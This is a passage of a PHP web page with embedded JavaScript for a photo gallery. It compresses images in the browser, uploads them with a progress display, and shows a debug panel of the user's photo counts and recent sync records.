    const img = new Image();
    img.onload = () => {
      let w = img.width, h = img.height;
      if (w > maxW) { h = Math.round(h * maxW / w); w = maxW; }
      if (h > maxW) { w = Math.round(w * maxW / h); h = maxW; }
      const c = document.createElement('canvas');
      c.width = w; c.height = h;
      c.getContext('2d').drawImage(img, 0, 0, w, h);
      c.toBlob(blob => resolve(blob ? new File([blob], file.name, {type:'image/jpeg'}) : file), 'image/jpeg', quality);
    };
    img.onerror = () => resolve(file);
    img.src = URL.createObjectURL(file);
  });
}

async function uploadFile(file, row) {
  // Compress if image
  const toUpload = await compressImage(file);
  const fd = new FormData();
    fd.append('file', toUpload);
    fd.append('user_id', UID);

    const xhr = new XMLHttpRequest();
    xhr.open('POST', 'upload-gallery.php');
    xhr.upload.onprogress = (e) => {
      if (e.lengthComputable) {
        const pct = Math.round(e.loaded / e.total * 100);
        row.querySelector('.prog-bar').style.width = pct + '%';
        row.querySelector('.up-status').textContent = pct + '%';
      }
    };
    xhr.onload = () => {
      if (xhr.status === 200) {
        row.querySelector('.prog-bar').style.width = '100%';
        row.querySelector('.prog-bar').style.background = '#10B981';
        row.querySelector('.up-status').textContent = '✅';
        row.querySelector('.up-status').style.color = '#10B981';
      } else {
        row.querySelector('.prog-bar').style.background = '#EF4444';
        row.querySelector('.up-status').textContent = '❌';
        row.querySelector('.up-status').style.color = '#EF4444';
        uploadFailed++;
      }
      uploadDone++;
      updSummary();
      if (uploadDone === uploadTotal) {
        setTimeout(() => {
          if (uploadFailed === 0) location.reload();
        }, 1500);
      }
    };
    xhr.onerror = () => {
      row.querySelector('.prog-bar').style.background = '#EF4444';
      row.querySelector('.up-status').textContent = '❌';
      uploadDone++; uploadFailed++;
      updSummary();
    };
    xhr.send(fd);
}

function updSummary() {
  const s = document.getElementById('uploadSummary');
  if (s) s.textContent = uploadDone + ' / ' + uploadTotal + (uploadFailed ? ' (' + uploadFailed + ' failed)' : '');
}
</script>

<?php if($uid):
  $dbg = [];
  try { $r=$pdo->prepare("SELECT COUNT(*) c FROM gallery_photos WHERE user_id=?"); $r->execute([$uid]); $dbg['total_photos']=(int)$r->fetch()['c']; } catch(\Throwable $e){ $dbg['total_photos']='err'; }
  try { $r=$pdo->prepare("SELECT MAX(synced_at) m FROM gallery_photos WHERE user_id=?"); $r->execute([$uid]); $dbg['last_sync']=$r->fetch()['m'] ?? 'never'; } catch(\Throwable $e){ $dbg['last_sync']='err'; }
  try { $r=$pdo->prepare("SELECT requested_at FROM gallery_sync_requests WHERE user_id=?"); $r->execute([$uid]); $sp=$r->fetch(); $dbg['sync_pending']=$sp ? $sp['requested_at'] : false; } catch(\Throwable $e){ $dbg['sync_pending']='err'; }
  $dbg['private_count']=0; $dbg['sent_count']=0;
  try { $r=$pdo->prepare("SELECT COUNT(*) c FROM gallery_photos WHERE user_id=? AND is_private=1"); $r->execute([$uid]); $dbg['private_count']=(int)$r->fetch()['c']; } catch(\Throwable $e){}
  try { $r=$pdo->prepare("SELECT COUNT(*) c FROM gallery_photos WHERE user_id=? AND is_sent=1"); $r->execute([$uid]); $dbg['sent_count']=(int)$r->fetch()['c']; } catch(\Throwable $e){}
  $dbg['recent_files']=[];
  try { $r=$pdo->prepare("SELECT filename, category, is_private, is_sent, synced_at FROM gallery_photos WHERE user_id=? ORDER BY synced_at DESC LIMIT 5"); $r->execute([$uid]); $dbg['recent_files']=$r->fetchAll(PDO::FETCH_ASSOC); } catch(\Throwable $e){}
?>
<div class="panel" style="margin-top:12px">
  <h3 style="font-size:.8rem;color:var(--mut)">🔧 Debug Info</h3>
  <pre style="font-size:.7rem;color:var(--mut);padding:8px;background:rgba(0,0,0,.2);border-radius:6px;font-family:monospace;white-space:pre-wrap;margin:0"><?= htmlspecialchars(json_encode($dbg, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE)) ?></pre>
</div>
<?php endif; ?>
<?php require __DIR__ . '/_dark_foot.php';
